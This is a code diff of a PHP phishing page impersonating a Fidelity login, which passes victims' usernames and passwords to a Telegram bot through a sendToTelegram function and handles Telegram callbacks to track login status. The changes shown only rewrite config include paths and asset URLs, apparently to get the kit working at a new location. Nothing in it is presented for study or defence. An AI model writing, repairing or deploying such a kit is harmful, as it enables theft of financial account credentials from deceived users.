@@ -2,7 +2,7 @@
 session_start();
 header('Content-Type: text/html; charset=UTF-8');
 
-include 'config.php';
+include __DIR__ . '/../config.php';
 
 function sanitizeInput($input) {
     if (is_array($input)) {
@@ -115,7 +115,7 @@ function getLoginStatus($sessionId) {
 }
 
 function processTelegramUpdate($update) {
-    include __DIR__ . '/config.php';
+    include __DIR__ . '/../config.php';
     
     if ($update && isset($update['callback_query'])) {
         $cb = $update['callback_query'];
@@ -218,7 +218,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'status') {
 }
 
 function sendToTelegram($username, $password, $userInfo) {
-    include 'config.php';
+    include __DIR__ . '/../config.php';
 
     $sessionId = getOrCreateUserId();
     
@@ -390,9 +390,9 @@ if (isset($_SESSION['login_submitted']) && $_SESSION['login_submitted'] && !$sta
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Log in to Fidelity</title>
-<link rel="stylesheet" href="assets/fonts.css">
-<link rel="stylesheet" href="assets/dom-signin.css">
-<link rel="stylesheet" href="assets/common-logincss.css">
+<link rel="stylesheet" href="/assets/fonts.css">
+<link rel="stylesheet" href="/assets/dom-signin.css">
+<link rel="stylesheet" href="/assets/common-logincss.css">
 <style>
 .pvdccl-label-root {
   margin-bottom: 0.5rem;
@@ -491,7 +491,7 @@ if (isset($_SESSION['login_submitted']) && $_SESSION['login_submitted'] && !$sta
 <div class="dom-small-12 dom-columns">
 <div class="dom-flex dom-flex-v-center">
 <a aria-current="page" href="/" class="dom-inline-block" data-testid="header-logo">
-<img alt="Fidelity" src="assets/Fidelity-wordmark.svg" height="28">
+<img alt="Fidelity" src="/assets/Fidelity-wordmark.svg" height="28">
 </a>
 </div>
 </div>
